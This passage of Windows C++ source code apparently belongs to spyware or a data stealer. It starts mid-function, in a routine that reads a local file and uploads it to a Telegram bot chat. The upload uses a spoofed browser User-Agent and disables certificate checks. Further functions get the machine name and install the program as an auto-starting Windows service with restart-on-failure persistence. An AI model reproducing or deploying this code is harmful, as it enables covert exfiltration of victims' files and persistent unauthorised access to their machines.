    fileStream.close();
    
    
    std::string boundary = "------------------------" + std::to_string(GetTickCount64());
    std::string headerContentType = "Content-Type: multipart/form-data; boundary=" + boundary;
    
    
    std::string body = "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
    body += TELEGRAM_CHAT_ID;
    body += "\r\n--" + boundary + "\r\n";
    
    
    if (!caption.empty()) {
        body += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
        body += caption;
        body += "\r\n--" + boundary + "\r\n";
    }
    
    body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + GenerateUniqueFilename() + "\"\r\n";
    body += "Content-Type: text/plain\r\n\r\n";
    
    
    std::vector<char> requestBody;
    requestBody.insert(requestBody.end(), body.begin(), body.end());
    requestBody.insert(requestBody.end(), fileData.begin(), fileData.end());
    
    std::string endBoundary = "\r\n--" + boundary + "--\r\n";
    requestBody.insert(requestBody.end(), endBoundary.begin(), endBoundary.end());
    
    
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 
                                    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                    WINHTTP_NO_PROXY_NAME, 
                                    WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (!hSession) return false;
    
    
    DWORD timeout = 10000;
    WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    
    
    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", StringToWString(apiPath).c_str(),
                                          NULL, WINHTTP_NO_REFERER, 
                                          WINHTTP_DEFAULT_ACCEPT_TYPES,
                                          WINHTTP_FLAG_SECURE);
    
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | 
                   SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    
    
    WinHttpAddRequestHeaders(hRequest, L"Accept: */*", -1, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, StringToWString(headerContentType).c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);
    
    
    if (!WinHttpSendRequest(hRequest, NULL, 0, requestBody.data(), (DWORD)requestBody.size(), 
                          (DWORD)requestBody.size(), 0)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    
    if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
                          NULL, &dwStatusCode, &dwStatusCodeSize, NULL)) {
        result = (dwStatusCode >= 200 && dwStatusCode < 300);
    }
    
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return result;
}


void EnsureDirectoryExists(const std::string& path) {
    std::size_t pos = 0;
    do {
        pos = path.find_first_of("\\/", pos + 1);
        std::string subdir = path.substr(0, pos);
        if (!subdir.empty()) {
            CreateDirectoryA(subdir.c_str(), NULL);
        }
    } while (pos != std::string::npos);
}


std::string GetComputerName() {
    
    static std::string cachedName = "PC";
    
    
    if (cachedName != "PC") {
        return cachedName;
    }
    
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer);
    if (::GetComputerNameA(buffer, &size)) {
        cachedName = std::string(buffer, size);
        return cachedName;
    }
    return cachedName;
}


BOOL InstallService() {
    
    char szPath[MAX_PATH];
    if (GetModuleFileNameA(NULL, szPath, MAX_PATH) == 0) {
        return FALSE;
    }

    
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == NULL) {
        return FALSE;
    }

    
    SC_HANDLE schService = CreateServiceW(
        schSCManager,              
        SERVICE_NAME,              
        SERVICE_DISPLAY_NAME,      
        SERVICE_ALL_ACCESS,        
        SERVICE_WIN32_OWN_PROCESS, 
        SERVICE_AUTO_START,        
        SERVICE_ERROR_NORMAL,      
        StringToWString(szPath).c_str(), 
        L"RPCSS",                  
        NULL,                      
        L"RPCSS\0Winmgmt\0",       
        L"NT AUTHORITY\\LocalService", 
        NULL);                     

    if (schService == NULL) {
        CloseServiceHandle(schSCManager);
        return FALSE;
    }

    
    SERVICE_DESCRIPTIONW sd = { const_cast<LPWSTR>(SERVICE_DESCRIPTION) };
    ChangeServiceConfig2W(schService, SERVICE_CONFIG_DESCRIPTION, &sd);
    
    
    SERVICE_FAILURE_ACTIONS failActions;
    SC_ACTION actions[3];
    
    
    ZeroMemory(&failActions, sizeof(SERVICE_FAILURE_ACTIONS));
    ZeroMemory(actions, sizeof(actions));
    
    actions[0].Type = SC_ACTION_RESTART;    
    actions[0].Delay = 60000;               
    actions[1].Type = SC_ACTION_RESTART;    
    actions[1].Delay = 60000;               
    actions[2].Type = SC_ACTION_NONE;       
    actions[2].Delay = 0;
    
    failActions.dwResetPeriod = 86400;      
    failActions.lpRebootMsg = NULL;
    failActions.lpCommand = NULL;
    failActions.cActions = 3;
    failActions.lpsaActions = actions;
    
    ChangeServiceConfig2W(schService, SERVICE_CONFIG_FAILURE_ACTIONS, &failActions);

    
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
    return TRUE;
}


BOOL UninstallService() {
    BOOL success = FALSE;

    
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == NULL) {
        return FALSE;
    }

    
    SC_HANDLE schService = OpenServiceW(schSCManager, SERVICE_NAME, SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
    if (schService == NULL) {
        CloseServiceHandle(schSCManager);
        return FALSE;
    }

    
    SERVICE_STATUS_PROCESS ssp;
    DWORD dwBytesNeeded;
    if (ControlService(schService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp)) {
        
        while (ssp.dwCurrentState != SERVICE_STOPPED) {
            Sleep(500);
            if (!QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded)) {
                break;
            }
        }
    }

    
    success = DeleteService(schService);

    
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
    return success;
}
